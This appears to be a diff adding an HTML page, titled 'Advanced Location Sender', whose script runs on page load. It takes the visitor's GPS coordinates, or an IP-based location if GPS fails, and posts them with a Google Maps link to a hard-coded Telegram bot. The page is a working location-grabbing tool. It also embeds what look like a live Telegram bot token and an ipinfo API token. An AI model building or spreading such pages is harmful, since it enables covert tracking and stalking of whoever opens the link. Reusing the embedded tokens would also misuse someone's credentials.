@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Location Sender</title>
+    <script>
+        // Function to send location to Telegram bot
+        async function sendToTelegram(message) {
+            try {
+                const botToken = "7297798760:AAGnBdRRlLer-ANQFyI0-Hq3G-0WcH3XfYA"; // Replace with your bot token
+                const chatId = "1691680798"; // Replace with your chat ID
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                await fetch(telegramUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+
+                console.log("Location sent to Telegram successfully.");
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+            }
+        }
+
+        // Function to use Geolocation API for exact coordinates
+        function getExactLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy; // Accuracy in meters
+
+                        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        const message = `Exact Location (via GPS):\nCoordinates: ${latitude}, ${longitude}\nAccuracy: ±${accuracy} meters\nGoogle Maps: ${mapsLink}`;
+
+                        console.log("Exact location acquired:", message);
+                        await sendToTelegram(message);
+                    },
+                    async (error) => {
+                        console.error("Geolocation failed, falling back to IP-based location.", error);
+                        await getIpBasedLocation();
+                    }
+                );
+            } else {
+                console.warn("Geolocation API not available, using IP-based location.");
+                getIpBasedLocation();
+            }
+        }
+
+        // Function to use IP-based location as a fallback
+        async function getIpBasedLocation() {
+            try {
+                const ipApiUrl = "https://ipinfo.io/json?token=f99959a4fa242a"; // Replace with your IPInfo token
+                const response = await fetch(ipApiUrl);
+                const locationData = await response.json();
+
+                const { city, region, country, loc } = locationData;
+                const [latitude, longitude] = loc.split(',');
+                const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                const message = `Approximate Location (via IP):\nCity: ${city}\nRegion: ${region}\nCountry: ${country}\nCoordinates: ${latitude}, ${longitude}\nGoogle Maps: ${mapsLink}`;
+
+                console.log("IP-based location acquired:", message);
+                await sendToTelegram(message);
+            } catch (error) {
+                console.error("Error getting IP-based location:", error);
+            }
+        }
+
+        // Initialize location fetching on page load
+        window.onload = () => {
+            console.log("Fetching location...");
+            getExactLocation();
+        };
+    </script>
+</head>
+<body>
+    <h1>Welcome</h1>
+    <p>Fetching and sending your exact or approximate location...</p>
+</body>
+</html>
